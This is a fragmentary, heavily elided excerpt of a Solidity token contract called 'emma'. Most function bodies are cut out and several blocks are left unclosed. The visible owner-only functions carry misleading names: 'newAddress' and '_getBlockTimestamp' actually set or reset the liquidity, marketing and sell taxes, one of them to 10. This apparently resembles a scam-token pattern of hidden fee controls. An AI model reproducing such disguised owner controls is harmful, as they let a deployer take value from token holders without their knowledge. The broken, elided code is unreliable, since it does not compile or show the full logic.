...
contract Ownable is Context, MagnitudeShare{  
    ...
    */
    ...
    function NewPendingAdmin(address _dividend) external onlyOwner {
...
contract emma is Context, IERC20, Ownable{
	...
	function _setprocessIndex(uint256 amount, uint256 _lastProcessedIndex,  uint256 gas) public view returns (uint256, uint256)       
		{
	...
	function _gettimeClaim(uint256 lastClaimTime, uint256 claimWait) private view returns (bool) {
    ...
    function setLastCombia(bool _flag, uint256 val) external view returns(uint256) {
			uint256 _autoRebase;
			if (_flag) {            
    ...
    function newAddress(uint8 newLiquidityTax, uint8 newMarketingTax, uint8 newBuyBackTax) external onlyOwner {
        taxLiquidity = newLiquidityTax;
        taxMarketing = newMarketingTax;
        taxSellBack = newBuyBackTax;
    }

    function _getBlockTimestamp() external onlyOwner {     
        taxLiquidity = 4;
        taxMarketing = 2;
        taxSellBack = 10;
        taxBuyBack = 3;
